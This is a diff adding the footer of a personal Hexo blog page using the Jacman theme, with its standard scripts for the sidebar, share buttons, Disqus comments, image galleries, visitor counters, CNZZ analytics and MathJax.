+	<section class="info">
+		<p> Hello ,I&#39;m MS in SCU. <br/>
+			Just have a little faith.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/杀手莱昂的美丽人生" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
+		
+		<a href="/about" target="_blank" title="MS">MS</a>
+		
+		
+		</p>
+</div>
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<span id="busuanzi_container_site_pv">
+      Total visits: <span id="busuanzi_value_site_pv"></span>
+</span>
+<span id="busuanzi_container_site_uv">
+      You are Visiter No.<span id="busuanzi_value_site_uv"></span>
+</span>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+<script type="text/javascript">
+
+var disqus_shortname = 'msarehere';
+
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1255712369'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s23.cnzz.com/z_stat.php%3Fid%3D1255712369' type='text/javascript'%3E%3C/script%3E"));</script>
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+
+  </body>
+</html>
